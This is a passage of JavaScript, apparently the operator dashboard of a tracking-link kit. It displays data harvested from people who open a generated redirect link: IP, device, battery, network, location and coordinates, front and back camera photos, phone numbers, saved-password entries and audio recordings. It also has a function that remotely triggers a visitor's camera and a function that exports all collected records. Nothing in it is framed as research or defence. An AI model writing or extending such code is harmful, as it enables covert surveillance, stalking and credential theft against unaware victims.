            const modal = document.getElementById('visitModal');
            const content = document.getElementById('visitDetailsContent');
            content.innerHTML = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                    <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A'}</div></div>
                    <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visit.ip || 'N/A'}</div></div>
                    <div class="detail-card"><label>📱 Device</label><div class="value">${visit.deviceInfo?.deviceName || visit.deviceInfo?.platform || 'N/A'}</div></div>
                    <div class="detail-card"><label>💻 OS</label><div class="value">${visit.deviceInfo?.os || 'N/A'}</div></div>
                    <div class="detail-card"><label>🌍 Browser</label><div class="value">${visit.deviceInfo?.browser || 'N/A'}</div></div>
                    <div class="detail-card"><label>🔋 Battery</label><div class="value">${visit.battery || 'N/A'}%</div></div>
                    <div class="detail-card"><label>📶 Network</label><div class="value">${visit.network?.effectiveType || visit.network?.type || 'N/A'}</div></div>
                    <div class="detail-card"><label>📍 Location</label><div class="value">${visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'}</div></div>
                    <div class="detail-card"><label>📍 Coordinates</label><div class="value">${visit.location ? `${visit.location.lat || 'N/A'}, ${visit.location.lng || 'N/A'}` : 'N/A'}</div></div>
                    ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera.image || visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                    ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera.image || visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                    ${visit.phoneNumber ? `<div class="detail-card"><label>📞 Phone Number</label><div class="value">${visit.phoneNumber}</div></div>` : ''}
                    ${visit.savedPasswords && visit.savedPasswords.length > 0 ? `<div class="detail-card"><label>🔑 Saved Passwords</label><div class="value">${visit.savedPasswords.map(p => p.email || p.id || 'Unknown').join(', ')}</div></div>` : ''}
                    ${visit.audioRecording ? `<div class="detail-card"><label>🎙️ Audio Recording</label><div class="value"><audio controls style="width:100%; max-width:200px;"><source src="${visit.audioRecording}" type="audio/webm"></audio></div></div>` : ''}
                    <div class="detail-card"><label>🔄 Redirect Complete</label><div class="value">${visit.redirectComplete ? '✅ Yes' : '❌ No'}</div></div>
                </div>
                <div style="margin-top:15px; display:flex; gap:10px; flex-wrap:wrap;">
                    <button onclick="downloadVisitImage('${userId}', ${visitIndex})" class="camera-btn" style="background:#48bb78; padding:8px 16px;">📥 Download Image</button>
                    <button onclick="exportVisitData('${userId}', ${visitIndex})" class="camera-btn" style="background:#667eea; padding:8px 16px;">📤 Export All Data</button>
                </div>
            `;
            modal.style.display = 'flex';
        });
}

// ============================================
// DELETE VISIT
// ============================================
function deleteVisit(userId, visitIndex) {
    if (!confirm('Delete this visit from history?')) return;
    fetch(`/api/visitor/${userId}/visit/${visitIndex}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Visit deleted successfully!');
                refreshAllData();
                showUserDetails(userId);
            }
        })
        .catch(error => {
            alert('Error: ' + error.message);
        });
}

// ============================================
// CAPTURE VISITOR PHOTO
// ============================================
function captureVisitorPhoto(type) {
    if (!currentVisitorId) {
        alert('Please select a visitor first');
        return;
    }
    const statusDiv = document.getElementById('captureStatus');
    if (statusDiv) {
        statusDiv.textContent = `📸 Requesting ${type} photo...`;
        statusDiv.style.color = '#4299e1';
    }
    socket.emit('admin-capture', {
        visitorId: currentVisitorId,
        type: type
    });
    setTimeout(() => {
        if (statusDiv) {
            statusDiv.textContent = `✅ ${type} photo requested! Refreshing...`;
            statusDiv.style.color = '#22a67e';
        }
        setTimeout(() => {
            showUserDetails(currentVisitorId);
            refreshAllData();
        }, 2000);
    }, 3000);
}

// ============================================
// DOWNLOAD PHOTO / AUDIO
// ============================================
function downloadPhoto(imageData, filename) {
    if (!imageData || imageData === 'null' || imageData === 'undefined') {
        alert('No photo to download');
        return;
    }
    try {
        const link = document.createElement('a');
        link.href = imageData;
        link.download = filename || 'visitor-photo.jpg';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        showNotification('⬇️ Downloaded!');
    } catch (e) {
        alert('Error: ' + e.message);
    }
}

function downloadAudio(audioData, filename) {
    if (!audioData) {
        alert('No audio to download');
        return;
    }
    try {
        const link = document.createElement('a');
        link.href = audioData;
        link.download = filename || 'audio.webm';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        showNotification('⬇️ Audio downloaded!');
    } catch (e) {
        alert('Error: ' + e.message);
    }
}

// ============================================
// DELETE VISITOR
// ============================================
function deleteVisitor(visitorId) {
    if (!confirm('Delete this visitor data?')) return;
    fetch(`/api/visitor/${visitorId}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Visitor deleted');
                refreshAllData();
                document.getElementById('visitorDetails').style.display = 'none';
            }
        });
}

// ============================================
// EXPORT ALL DATA
// ============================================
function exportAllData() {
    fetch('/api/users-data')
        .then(response => response.json())
        .then(users => {
            const dataStr = JSON.stringify(users, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'users-data-' + new Date().toISOString().slice(0,10) + '.json';
            a.click();
            URL.revokeObjectURL(url);
            showNotification('📥 Data exported successfully!');
        });
}

// ============================================
// COPY LINK
// ============================================
function copyLink() {
    const linkInput = document.getElementById('generatedLink');
    linkInput.select();
    document.execCommand('copy');
    showNotification('📋 Link copied!');
}

// ============================================
// LOGOUT
// ============================================
function logout() {
    fetch('/logout', { method: 'POST' })
        .then(() => {
            window.location.href = '/';
        });
}

// ============================================
// SHOW NOTIFICATION
// ============================================
function showNotification(message) {
    const existing = document.querySelector('.notification');
    if (existing) existing.remove();
    const div = document.createElement('div');
    div.className = 'notification';
    div.textContent = message;
    document.body.appendChild(div);
    setTimeout(() => {
        div.style.opacity = '0';
        div.style.transition = 'opacity 0.5s';
        setTimeout(() => div.remove(), 500);
    }, 3000);
}

// ============================================
// INITIAL LOAD
// ============================================
loadVisitors();
updateStats();

setInterval(() => {
    refreshAllData();
    loadLinks();
}, 15000);